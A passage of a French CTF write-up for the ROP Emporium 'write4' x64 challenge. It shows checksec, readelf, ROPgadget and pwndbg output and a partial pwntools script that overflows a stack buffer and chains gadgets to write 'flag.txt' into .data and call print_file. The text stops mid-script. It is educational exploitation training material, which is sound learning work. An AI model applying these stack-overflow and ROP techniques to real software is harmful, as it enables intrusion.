Si vous ne comprenez pas quelque chose, je vous invite à regarder la série dans l&amp;rsquo;ordre.
Description On completing our usual checks for interesting strings and symbols in this binary we&amp;#39;re confronted with the stark truth that our favourite string &amp;#34;/bin/cat flag.</description>
            <content type="html"><![CDATA[<h1 id="note">Note</h1>
<p>Quatrième exo de ROPEmporium, il introduit une nouvelle méchanique et nous pousse à utiliser un nouveau type de gadget, très intéressant</p>
<p>Si j&rsquo;ai fait des erreurs, n&rsquo;hésitez pas à me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a> pour me le dire.</p>
<p>Si vous ne comprenez pas quelque chose, je vous invite à <a href="../../../../series/ropemporium-x64-series/">regarder la série dans l&rsquo;ordre</a>.</p>
<h2 id="description">Description</h2>
<pre tabindex="0"><code>On completing our usual checks for interesting strings and symbols in this binary we&#39;re confronted with the stark truth that our favourite string &#34;/bin/cat flag.txt&#34; is not present this time. 
Although you&#39;ll see later that there are other ways around this problem, such as resolving dynamically loaded libraries and using the strings present in those, we&#39;ll stick to the challenge goal which is learning how to get data into the target process&#39;s virtual address space via the magic of ROP.

Important!
A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like &#34;flag.txt&#34;) as the 1st argument. 
</code></pre><h2 id="file-information">File information</h2>
<p>Avant de commencer à regarder dans l&rsquo;executable, il faut savoir à quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les éventuelles sécuritées avec lesquelles il a été compilé</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">write4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">write4</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">4cbaee0791e9daa7dcc909399291b57ffaf4ecbe</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer à un executable en 64bit, linké dynamiquement et qui n&rsquo;est pas strippé</p>
<p>Maintenant le <code>checksec</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">write4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/write4_x64/write4&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Comme pour le précédent, <strong>NX</strong> est activé donc pas de shellcode, mais ce n&rsquo;est pas un problème puisque la description de l&rsquo;exercice nous indique exactement quoi faire</p>
<h2 id="exploitation">Exploitation</h2>
<p>On va le lancer pour voir ce qu&rsquo;il fait concrètement:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/213875956-5f7e3f8e-3d1e-42a1-b4f6-53168ef66fb4.png" alt="2023-01-21-151701_1046x476_scrot"></p>
<p>On voit que si on entre un nombre élevé de bytes dans l&rsquo;input le programme plante (<code>segfault</code>), ce qui veut dire qu&rsquo;on a commencé à overwrite des registres.</p>
<p>Cette fois pas besoin de désassembler les fonctions puisqu&rsquo;on sait exactement ce qu&rsquo;il faut faire, on peut commencer à ressembler les élements nécessaires pour construire notre payload.</p>
<p>Commençons par regarder les sections de l&rsquo;executable pour en trouver une dans laquelle on va pouvoir écrire:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>readelf <span style="color:#f92672">-</span>S write4                                                                  
</span></span><span style="display:flex;"><span>There are <span style="color:#ae81ff">29</span> section headers, starting at offset <span style="color:#ae81ff">0x1980</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Section Headers:
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span>  [<span style="color:#ae81ff">23</span>] <span style="color:#f92672">.</span>data             PROGBITS         <span style="color:#ae81ff">0000000000601028</span>  <span style="color:#ae81ff">00001028</span>
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000010</span>  <span style="color:#ae81ff">0000000000000000</span>  WA       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span></code></pre></div><p>On voit que <code>.data</code> a les flags <strong>W</strong> et <strong>A</strong> qui correspondent à <strong>WRITE</strong> et <strong>ALLOCATE</strong>  donc on pourra écrire dans cette sections, gardons son adresse de côté (<code>0x00601028</code>)</p>
<p>Maintenant qu&rsquo;on sait <strong>où</strong> on va écrire, il faut savoir <strong>comment</strong> on va le faire. Pour cela, on va avoir besoin de deux gadgets:</p>
<ul>
<li>Le premier gadget devra <code>pop</code> deux registres</li>
<li>Le second devra mettre la valeur de l&rsquo;un dans le pointeur de l&rsquo;autre</li>
</ul>
<p>Concrètement, l&rsquo;idée va être de mettre dans un premier registre l&rsquo;adresse de <code>.data</code> et dans un deuxième notre string <code>&quot;/bin/cat flag.txt&quot;</code> . Ensuite, l&rsquo;idée sera de mettre le string dans le pointeur du premier registre, soit dans la section <code>.data</code>. Si c&rsquo;est un peu flou pour l&rsquo;instant, vous devriez mieux comprendre avec le code.</p>
<p>Regardons les gadgets présents dans le binaire avec ROPgadget:</p>
<p>Tout d&rsquo;abord, les <code>pop</code> gadgets:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary write4 <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: pop&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068c</span> : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068e</span> : pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400690</span> : pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400692</span> : pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400604</span> : pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057b</span> : pop rbp ; mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068b</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068f</span> : pop rbp ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400588</span> : pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400693</span> : pop rdi ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400691</span> : pop rsi ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068d</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span></code></pre></div><p>On voit un <code>pop r14 ; pop r15 ; ret</code> à l&rsquo;adresse <code>0x00400690</code>, exactement ce qu&rsquo;il nous faut</p>
<p>Maintenant il faut espérer qu&rsquo;il existe un gadget <code>mov</code> avec ces deux registres, et sans trop de contrainte</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary write4 <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: mov&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040061c</span> : mov ah, <span style="color:#ae81ff">6</span> ; add al, bpl ; jmp <span style="color:#ae81ff">0x400621</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005e2</span> : mov byte ptr [rip <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200a4f</span>], <span style="color:#ae81ff">1</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400629</span> : mov dword ptr [rsi], edi ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400610</span> : mov eax, <span style="color:#ae81ff">0</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400602</span> : mov ebp, esp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057c</span> : mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400628</span> : mov qword ptr [r14], r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400601</span> : mov rbp, rsp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span></code></pre></div><p>On voit un <code>mov qword ptr [r14], r15 ; ret</code> à l&rsquo;adresse <code>0x00400628</code>, encore une fois exactement ce qu&rsquo;il nous faut.</p>
<blockquote>
<p>L&rsquo;instruction <code>mov</code> déplace le cotenu du second registre dans le premier, en l&rsquo;occurence ici, il déplace la valeur de r15 dans l&rsquo;adresse dans r14 (grâce au <code>qword ptr</code>)</p>
</blockquote>
<p>Mais il nous manque encore un gadget! Si on regarde attentivement la description du challenge, on voit qu&rsquo;il existe un fonction <code>print_file()</code> qui prend en argument le nom d&rsquo;un fichier. Le string qu&rsquo;on va écrire dans <code>.data</code> va donc être <code>flag.txt</code> et plus <code>&quot;/bin/cat flag.txt&quot;</code>.</p>
<blockquote>
<p>Rappel: En 64bit, les fonctions prennent leurs arguments dans les registres <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>&hellip; (vous pouvez trouver la liste des registres <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame">ici</a>).
Donc, en modifiant <code>rdi</code> et en plaçant l&rsquo;adresse de <code>.data</code> dedans, la fonction <code>print_file()</code> prendra notre string en premier argument</p>
</blockquote>
<p>Nous avons donc besoin d&rsquo;un <code>pop rdi</code> !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary write4 <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop rdi ; ret&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400693</span> : pop rdi ; ret 
</span></span></code></pre></div><p>Parfait, il nous faut maintenant deux dernières choses: l&rsquo;adresse de la fonction <code>print_file()</code> et le padding nécessaire pour réecrire la sauvegarde de <code>rip</code>.</p>
<blockquote>
<p>Puisque PIE n&rsquo;est pas activé, on peut trouver statiquement l&rsquo;adresse de <code>print_file</code>, si il était activé, nous aurions dû le contourner, par exemple en trouvant la base address de l&rsquo;executable</p>
</blockquote>
<p>Commençons par trouver l&rsquo;adresse de <code>print_file()</code> avec <code>pwndbg</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004004d0</span>  _init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400500</span>  pwnme<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400510</span>  print_file<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400520</span>  _start
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400550</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400560</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400590</span>  register_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005d0</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400600</span>  frame_dummy
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400607</span>  main
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400617</span>  usefulFunction
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400628</span>  usefulGadgets
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400630</span>  __libc_csu_init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a4</span>  _fini
</span></span></code></pre></div><p>Nickel, maintenant le padding:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass pwnme
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008aa</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008ab</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008ae</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: sub    rsp,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008b2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>: mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200727</span>]        <span style="color:#75715e"># 0x7ffff7e00fe0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008b9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;</span>:    mov    rax,QWORD PTR [rax]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008bc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">&gt;</span>:    mov    ecx,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008c1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;</span>:    mov    edx,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008c6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>:    mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008cb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:    mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008ce</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00790</span> <span style="color:#f92672">&lt;</span>setvbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008d3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">41</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x106</span>]        <span style="color:#75715e"># 0x7ffff7c009e0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008da</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">48</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00730</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008df</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">53</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x111</span>]        <span style="color:#75715e"># 0x7ffff7c009f7</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008e6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00730</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008eb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&gt;</span>:    lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008ef</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:    mov    edx,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008f4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;</span>:    mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008f9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">79</span><span style="color:#f92672">&gt;</span>:    mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008fc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00760</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00901</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xf8</span>]        <span style="color:#75715e"># 0x7ffff7c00a00</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00908</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">94</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00730</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0090d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">99</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x115</span>]        <span style="color:#75715e"># 0x7ffff7c00a29</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00914</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">106</span><span style="color:#f92672">&gt;</span>:   mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0x00007ffff7c00919</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">111</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c00750</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0091e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">116</span><span style="color:#f92672">&gt;</span>:   lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00922</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">120</span><span style="color:#f92672">&gt;</span>:   mov    edx,<span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00927</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">125</span><span style="color:#f92672">&gt;</span>:   mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0092a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">128</span><span style="color:#f92672">&gt;</span>:   mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0092f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">133</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c00770</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00934</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">138</span><span style="color:#f92672">&gt;</span>:   lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xf1</span>]        <span style="color:#75715e"># 0x7ffff7c00a2c</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0093b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">145</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c00730</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00940</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">150</span><span style="color:#f92672">&gt;</span>:   nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00941</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">151</span><span style="color:#f92672">&gt;</span>:   leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00942</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">152</span><span style="color:#f92672">&gt;</span>:   ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><blockquote>
<p>J&rsquo;ai désassemblé la fonction en débuggant l&rsquo;executable puisqu&rsquo;elle était vide tant que le programme n&rsquo;était pas lancé
Pour reproduire ceci, mettez un breakpoint au début de la fonction puis avancez dans l&rsquo;éxecution jusqu&rsquo;au <code>read</code>, puis désassemblez <code>pwnme</code></p>
</blockquote>
<p>On voit que le buffer est situé à <code>rbp-0x20</code> et que la fonction <code>read</code> va lire <code>0x200</code> bytes d&rsquo;input, ce qui est largement assez. Pour réecrire la sauvegarde de <code>rip</code>, il nous faut <code>0x8</code> bytes de plus que le buffer, donc notre padding total sera de <code>(0x20+0x8)</code> bytes.</p>
<p>Puisque je suis toujours sous Ubuntu, on peut s&rsquo;attendre à des problèmes de stack alignment donc je vais ajouter un <code>ret</code> juste après mon padding</p>
<h2 id="final-payload">Final Payload</h2>
<p>Passons à l&rsquo;exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./write4&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004004e6</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_r14_r15 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400690</span>)
</span></span><span style="display:flex;"><span>data_section <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00601028</span>)
</span></span><span style="display:flex;"><span>string <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mov_ptr_r14_r15 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400628</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400693</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print_file <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400510</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met l&#39;adresse de la section .data dans r14 et notre &#34;flag.txt&#34; dans r15</span>
